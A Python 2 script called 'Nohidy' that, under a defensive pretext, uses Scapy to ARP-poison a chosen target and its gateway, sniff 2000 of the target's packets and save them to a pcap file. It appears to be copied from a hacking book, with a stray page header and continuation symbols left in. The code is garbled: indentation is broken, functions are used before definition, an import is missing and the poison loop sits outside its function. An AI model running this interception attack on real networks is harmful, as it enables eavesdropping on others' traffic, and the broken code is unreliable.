from scapy.all import *
import os
import sys
import threading
import signal
print""
print"fighting an attacker on the inside i see :) i will do my very best to find it master"
print""

'''
Nohidy is a free software you could redistribute it and/or modify it under the terms of the 
GNU General Public License as published by the Free Software Foundation either version 3.0 of the License or any later version.
Nohidy is free of charge but we accept donations(it would help if you donated both 
to flipchan and the Free Software Foundation).
Nohidy is distributed  in the hope that it will be useful, but WITHOUT ANY WARRANTY : 
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A 
PARTICULAR PURPOSE see the GNU General Public License along with Nohidy. if not see <http://www.gnu.org/licenses>.
__author__ = "Filip kalebo"
__copyright__ = "Free Software Foundation"
__license__ = "GPL"
__version__ = "3.0"
__maintainer__ = "Filip kalebo"
__email__ = "flipchan@riseup.net"
__status__ = "still in developing"
'''

interfajan =raw_input("what network interface do you use?: ")
vicccttom =raw_input("What the attackers/targets ip: ")
gateeeway =raw_input("what the gateways ip ?: ")

interface    = interfajan
target_ip    = vicccttom
gateway_ip   = gateeeway
packet_count = 2000




# set our interface
conf.iface = interface
# turn off output
conf.verb = 0
print "[*] Setting up %s" % interface
 
gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "[!!!] Failed to get gateway MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)
 
target_mac = get_mac(target_ip)

if target_mac is None:
    print "[!!!] Failed to get target MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Target %s is at %s" % (target_ip,target_mac)

# start poison thread
poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac,target_ip,target_mac))
poison_thread.start()
try:
    print "[*] Starting sniffer for %d packets" % packet_count

   bpf_filter = "ip host %s" % target_ip
   packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
 # write out the captured packets
   wrpcap('arper.pcap',packets)
 # restore the network
   restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
except KeyboardInterrupt:
# restore the network
restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
sys.exit(0)

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):


# slightly different method using send
print "[*] Restoring target..."
send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, ¬
hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, ¬
hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
# signals the main thread to exit
os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):

responses,unanswered = ¬

srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),¬
timeout=2,retry=10)
# return the MAC address from a response
for s,r in responses:
return r[Ether].src
return None
Owning the Network with Scapy   53
def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac
 
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac

print "[*] Beginning the ARP poison master. [press CTRL-C to stop]"

while True:
   try:
      send(poison_target)
     
      send(poison_gateway)
    
      time.sleep(2)
   except KeyboardInterrupt:
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

print "[*] ARP poison attack finished."
return
